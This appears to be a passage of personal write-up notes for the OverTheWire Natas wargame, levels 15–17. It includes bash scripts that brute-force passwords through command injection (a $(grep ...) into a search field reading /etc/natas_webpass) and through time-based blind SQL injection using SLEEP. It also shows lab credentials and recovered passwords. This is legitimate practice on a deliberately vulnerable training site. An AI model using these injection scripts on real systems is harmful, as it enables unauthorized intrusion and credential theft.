#!/bin/bash

CHARS="bhjkoqsvwCEFHJLNOT05789"
URL="natas16.natas.labs.overthewire.org"
LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS="E"
PASS_LEN=31


for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		TMP=$PASS
		TMP+=$char
		OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $TMP /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
		if [ "$OUT" -eq 0 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas17: $PASS"
```

>abs@MacBookPro OverTheWire % ./brute_force_natas16_2.sh 
```
Password for natas17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

# Level 16 -> 17:
abs@MacBookPro OverTheWire % curl "natas17.natas.labs.overthewire.org/" -u natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC                                                                       
```
<h1>natas17</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Exectly the same as natas15, but it doesn't show me the prints...

It had to do something with timing.
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas17.natas.labs.overthewire.org/index.php"
LOGIN="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
	    SECONDS=0
		curl $URL -u $LOGIN -s -F "username=natas18\" AND IF(BINARY SUBSTRING(password,$pos,1)=\"$char\", SLEEP(5), 0) -- \"" > /dev/null
		if [ $SECONDS -ge 5 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas18: $PASS"
```

abs@MacBookPro natas % ./brute_force_natas17.sh
```
Password for natas18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

# Level 17 -> 18:
# Level 18 -> 19:
# Level 19 -> 20:
# Level 20 -> 21:
# Level 21 -> 22:
# Level 22 -> 23:
# Level 23 -> 24:
# Level 24 -> 25:
# Level 25 -> 26:
# Level 26 -> 27:
# Level 27 -> 28:
# Level 28 -> 29:
# Level 29 -> 30:
# Level 30 -> 31:
# Level 31 -> 32:
# Level 32 -> 33:
# Level 33 -> 34: